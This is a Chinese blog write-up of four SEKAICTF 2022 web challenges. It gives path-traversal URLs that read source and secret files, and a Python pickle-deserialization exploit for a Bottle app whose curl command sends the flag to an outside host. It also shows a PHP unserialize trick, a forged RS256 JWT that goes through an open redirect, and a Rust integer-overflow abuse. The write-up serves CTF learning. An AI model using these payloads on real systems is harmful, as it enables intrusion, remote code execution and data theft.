---
title: SEKAICTF 2022 Web Writeup
date: 2022-10-03 22:46:00
updated: 2022-10-03 22:46:00
tags: [ctf,security]
description: 一场国外练手赛，题目质量挺高
category: CTF
---

## Bottle Poem

> Come and read poems in the bottle.
> No bruteforcing is required to solve this challenge. Please do not use scanner tools.
> Author: bwjy

Python Bottle框架伪造session打pickle反序列化的题目。

`/show`接口存在任意文件读取漏洞

`/show?id=../../../../../../proc/self/cmdline`得到源码位置`/app/app.py`

`/show?id=../../../../../../app/app.py`读取源码

```python
from bottle import route, run, template, request, response, error
from config.secret import sekai
import os
import re


@route("/")
def home():
    return template("index")


@route("/show")
def index():
    response.content_type = "text/plain; charset=UTF-8"
    param = request.query.id
    if re.search("^../app", param):
        return "No!!!!"
    requested_path = os.path.join(os.getcwd() + "/poems", param)
    try:
        with open(requested_path) as f:
            tfile = f.read()
    except Exception as e:
        return "No This Poems"
    return tfile


@error(404)
def error404(error):
    return template("error")


@route("/sign")
def index():
    try:
        session = request.get_cookie("name", secret=sekai)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=sekai)
            return template("guest", name=session["name"])
        if session["name"] == "admin":
            return template("admin", name=session["name"])
    except:
        return "pls no hax"


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    run(host="0.0.0.0", port=8080)
```

`/show?id=../../../../../../app/config/secret.py`找到secret`sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"`

先成为admin看看有没有什么东西
![图 3](https://s2.loli.net/2022/10/02/PGVurZn9R6w4ISf.png)

然后把admin的模板文件读出来了也没找到什么

```html
<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Sekai's boooootttttttlllllllleeeee</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="text-white bg-zinc-800 container px-4 mx-auto text-center h-screen box-border flex justify-center item-center flex-col">
        Hello, you are {{name}}, but it’s useless.
</body>
</html>
```

看bottle的源码发现是cookie_decode的时候会用pickle.loads,而pickle.loads会将反序列化得到的字符串当作命令执行，因此可以实现RCE。

> pickle反序列化可以参考文章`<https://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>`

EXP:

```python
from bottle import route, run,response
import os


sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"

class exp():
    def __reduce__(self):
        # cmd = "curl http://x.x.x.x:7777/123?res=`ls -la /|base64 -w 0`"
        cmd = "curl http://x.x.x.x:7777/123?res=`/flag|base64 -w 0`"
        return (os.system, (cmd,))


@route("/sign")
def index():
    try:
        # session = {"name": "admin"}
        session = exp()
        response.set_cookie("name", session, secret=sekai)
        return "success"
    except:
        return "pls no hax"


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    run(host="0.0.0.0", port=8080)
```

![图 2](https://s2.loli.net/2022/10/02/BZdlyWzkIfGiMSK.png)

![图 1](https://s2.loli.net/2022/10/02/IVm29Hk4PW75MEL.png)

## Sekai Game Start

无聊的PHP Trick题目

```php
include('./flag.php');
class Sekai_Game{
    public $start = True;
    public function __destruct(){
        if($this->start === True){
            echo "Sekai Game Start Here is your flag ".getenv('FLAG');
        }
    }
    public function __wakeup(){
        $this->start=False;
    }
}
if(isset($_GET['sekai_game.run'])){
    unserialize($_GET['sekai_game.run']);
}else{
    var_dump($_GET);
    highlight_file(__FILE__);
}

?>
```

用`var_dump($_GET);`可以打印变量，发现.会被解析成`_`。

![图 1](https://s2.loli.net/2022/10/02/4SNjolFTWZtqu6L.png)

所以第一步是找到如何能够输入变量`sekai_game.run`。

> 参考文章`<https://www.freebuf.com/articles/web/213359.html>`和`<https://blog.csdn.net/solitudi/article/details/120502141>`

原因是PHP的parse_str函数通常被自动应用于get、post请求和cookie中。如果你的Web服务器接受带有特殊字符的参数名，那么也会发生类似的情况。

这是PHP源码中找到的代码片段

```PHP
 /* ensure that we don't have spaces or dots in the variable name (not binary safe) */
 for (p = var; *p; p++) {
  if (*p == ' ' || *p == '.') {
   *p='_';
  } else if (*p == '[') {
   is_array = 1;
   ip = p;
   *p = 0;
   break;
  }
 }
```

因此结论是`[`和`.`以及空格会被解析为`_`，但是如果前面有`[`，例如`[[`只会将前一个`[`解析成`_`，因此`sekai[game.run`会被解析为`sekai_game.run`，也就是这里的Trick。

根据文章`<https://bugs.php.net/bug.php?id=81151>`，输入`?sekai[game.run=C:10:"Sekai_Game":0:{}`。

![图 2](https://s2.loli.net/2022/10/02/ypzBOh7XvYDPbKV.png)

## Issues

一道JWT伪造的题目。

根据源代码中对传入JWT的校验，当Header中issuer属性不正确时，会给出`valid_issuer`，所以先随便传一个JWT,拿到`valid_issuer`。

```python
def get_public_key_url(token):
    is_valid_issuer = lambda issuer: urlparse(issuer).netloc == valid_issuer_domain

    header = jwt.get_unverified_header(token)
    if "issuer" not in header:
        raise Exception("issuer not found in JWT header")
    token_issuer = header["issuer"]

    if not is_valid_issuer(token_issuer):
        raise Exception(
            "Invalid issuer netloc: {issuer}. Should be: {valid_issuer}".format(
                issuer=urlparse(token_issuer).netloc, valid_issuer=valid_issuer_domain
            )
        )

    pubkey_url = "{host}/.well-known/jwks.json".format(host=token_issuer)
    return pubkey_url
```

![图 2](https://s2.loli.net/2022/10/02/M7awOEBhvkDAcJL.png)  

![图 1](https://s2.loli.net/2022/10/02/yVKhBd5JW4kwGtu.png)  

那么接下来我们让Header中的issuer变成`http://localhost:8080`。因为有`http://`这里`netloc`才能解析出`localhost:8080`

![图 3](https://s2.loli.net/2022/10/02/SQonmNLk8DytsCq.png)  

然后这里还有个问题是RS256的公钥和密钥的校验怎么办，这也是完成伪造的关键一步。

代码中解析publickey的部分为`pubkey_url = "{host}/.well-known/jwks.json".format(host=token_issuer)`，public key来自header里issuer来源，而要求header里的issuer来自环境变量中的`HOST`，使逻辑上让public key也来自本地。

```python
valid_issuer_domain = os.getenv("HOST") #从环境变量中HOST获取valid_issuer_domain为localhost:8080

def get_public_key_url(token):
    is_valid_issuer = lambda issuer: urlparse(issuer).netloc == valid_issuer_domain

    header = jwt.get_unverified_header(token)
    if "issuer" not in header:
        raise Exception("issuer not found in JWT header")
    token_issuer = header["issuer"]

    if not is_valid_issuer(token_issuer):
        raise Exception(
            "Invalid issuer netloc: {issuer}. Should be: {valid_issuer}".format(
                issuer=urlparse(token_issuer).netloc, valid_issuer=valid_issuer_domain
            )
        )

    pubkey_url = "{host}/.well-known/jwks.json".format(host=token_issuer) #把token_issuer作为HOST获取jwks.json
    return pubkey_url
```

那么我们这里就需要既能通过`valid_issuer_domain`的校验让其认为是来自`localhost:8080`，又让`pubkey_url`从我们给出的HOST获取公钥，来完成JWT的伪造。

```python
@app.route("/logout")
def logout():
    session.clear()
    redirect_uri = request.args.get('redirect', url_for('home'))
    return redirect(redirect_uri)
```

而`/logout`的路由处提供来redirect的功能，使我们可以构造`http://localhost:8080/logout?redirect=http://Host:Port`,让`valid_issuer_domain`会获取到`localhost:8080`而`pubkey_url`会去`http://Host:Port`拿公钥。

用自己的一对公私钥来生成一个JWT

![图 5](https://s2.loli.net/2022/10/02/Ttd6u4MYj2vEyNS.png)  

```text
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImlzc3VlciI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9sb2dvdXQ_cmVkaXJlY3Q9aHR0cDovLzM5LjEwOC4yNTMuMTA1Ojc3NzcifQ.eyJ1c2VyIjoiYWRtaW4ifQ.QZBreri9WxDMyshYnTRPkz15feQO21eVFw5Dm6Ipo-l8LNrffErnmQVVxxuo4B6ycHVDbRRIaijwPDqGuWxfUNdWKOQqy3ceL9eC_ZPUWe96O71N51CkZBovLG7cLtjWy1zapZS5nFYplottVgkR2pAGlv9oeKmWOt_5PZvKggyDK4KEDZIo29qYCt9LnxWqAaxYm8g6bUA-4j_OkjtseM64uGfrGwDIh_x-od1-Mhk7GjP92kbQX-cgT6u_d3E-ZrRGRVVA4FDzLf6HcSY9-wNAF9ahldETUUAjdq5uX7IWVSamfOqVSotI4-cSkYytPgKWlFpc_k19vCeX-sg9pA
```

在服务器上放这个json文件

```json
{
    "keys": [
        {
            "alg": "RS256",
            "x5c": [
                "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo\n4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u\n+qKhbwKfBstIs+bMY2Zkp18gnTxKLxoS2tFczGkPLPgizskuemMghRniWaoLcyeh\nkd3qqGElvW/VDL5AaWTg0nLVkjRo9z+40RQzuVaE8AkAFmxZzow3x+VJYKdjykkJ\n0iT9wCS0DRTXu269V264Vf/3jvredZiKRkgwlL9xNAwxXFg0x/XFw005UWVRIkdg\ncKWTjpBP2dPwVZ4WWC+9aGVd+Gyn1o0CLelf4rEjGoXbAAEgAqeGUxrcIlbjXfbc\nmwIDAQAB"
            ]
        }
    ]
}
```

带token请求`/api/flag` -> 通过`valid_issuer_domain`的域名校验和Token的公钥校验 -> 拿到flag

![图 6](https://s2.loli.net/2022/10/02/qfheQzRv7rjusWl.png)  

## Crab Commodities

赛后复现出来的，一道Rust的逻辑漏洞题。

注册账号登陆后会有`$30000`，并且有贷款，增加库存，增加商店，捐款，购买Flag，睡觉和在市场里消费这样一些功能，而时间仅有7天贷款只能一次，因此正常玩是不可能买下Flag的，需要的钱太多了。

![图 1](https://s2.loli.net/2022/10/04/R9ZVK4gIPCUAOyF.png)  

题目是给出了源代码的，看到`api.rs`在`/upgrade`接口中，增加库存和增加商店的逻辑处理这部分。

```rust

#[post("/upgrade")]
async fn upgrade(user: User, body: web::Form<ItemPayload>) -> Json<APIResult> {
    if user.game.is_over() {
        return web::Json(APIResult {
            success: false,
            message: "The game is over",
        });
    }

    if body.quantity <= 0 || body.quantity > 32767 {
        return web::Json(APIResult {
            success: false,
            message: "Invalid quantity",
        });
    }

    // upgrades
    if let Some(item) = crate::game::UPGRADES.iter().find(|u| u.name == body.name) {
        let mut price = item.price;

        // quantity matters for donate and storage
        if item.name == "Donate to charity" || item.name == "Storage Upgrade" {
            price *= body.quantity;
        }

        // upgrade checks
        if user.game.has_upgrade("Loan") && item.name == "Loan" {
            return web::Json(APIResult {
                success: false,
                message: "You can't take out another loan",
            });
        }
        if user.game.has_upgrade("More Commodities") && item.name == "More Commodities" {
            return web::Json(APIResult {
                success: false,
                message: "You already have access to all commodities",
            });
        }

        if user.game.money.get() < price as i64 {
            return web::Json(APIResult {
                success: false,
                message: "Not enough money",
            });
        }

        let mut upgrades = user.game.upgrades.get();
        upgrades.extend(vec![item].repeat(body.quantity as usize));
        if upgrades.len() > 32767 {
            return web::Json(APIResult {
                success: false,
                message: "Too many upgrades purchased",
            });
        }
        user.game.upgrades.set(upgrades);

        if price != 0 {
            user.game.money.set(user.game.money.get() - price as i64);
        }

        if item.name == "Storage Upgrade" {
            return web::Json(APIResult {
                success: true,
                message: "Enjoy your new storage",
            });
        } else if item.name == "More Commodities" {
            let mut market = user.game.market.get();
            market.extend(crate::game::EXTENDED_ITEMS);
            user.game.market.set(market);
            user.game.market.set(user.game.randomize_market());
            return web::Json(APIResult {
                success: true,
                message: "Enjoy your new selection",
            });
        } else if item.name == "Flag" {
            return web::Json(APIResult {
                success: true,
                message: "Hacker...",
            });
        } else if item.name == "Loan" {
            user.game.debt.set(user.game.debt.get() - item.price as i64); // since item.price is negative for loan
            return web::Json(APIResult {
                success: true,
                message: "Make sure to pay it back...",
            });
        } else if item.name == "Donate to charity" {
            return web::Json(APIResult {
                success: true,
                message: "What a nice gesture :)",
            });
        } else if item.name == "Sleep" {
            user.game.day.set(user.game.day.get() + 1);
            user.game.market.set(user.game.randomize_market());

            return web::Json(APIResult {
                success: true,
                message: "Have a nice rest...",
            });
        }
    }
    web::Json(APIResult {
        success: false,
        message: "No upgrade found with that name",
    })
}
```

在这一部分中

```rust
        // quantity matters for donate and storage
        if item.name == "Donate to charity" || item.name == "Storage Upgrade" {
            price *= body.quantity;
        }
```

我们可以看到因为需要进行单价乘以数量等于总量的计算，因此有`price *= body.quantity`，这看起来是很合理的。

```rust
#[derive(Debug, Copy, Clone, Serialize)]
pub struct Item {
    pub name: &'static str,
    pub price: i32,
    pub volatility: f64,
}
```

而我们再看到`game.rs`中是如何定义`price`变量，这里`price`是一个有符号的32位整数，也就是漏洞产生的原因，当`price`溢出时进行价格的计算，就会不减反加，而且贷款等功能也是通过一个负数价格来进行增加的，总之这里的设计导致了会产生漏洞，在这里传入的`body.quantity`当比较大时，计算出的`price`会溢出成一个负数，而这时候进行付款计算，我们的钱就会增加，当然我们需要恰好溢出一些使其成为一个比较大的负数，来刚好能买下flag。

购买`22000`个增加库存。

![图 2](https://s2.loli.net/2022/10/04/ntjwCzOGBbhf6c1.png)  

![图 3](https://s2.loli.net/2022/10/04/nhKstz4aAHbYXlO.png)  

`SEKAI{rust_is_pretty_s4fe_but_n0t_safe_enough!!}`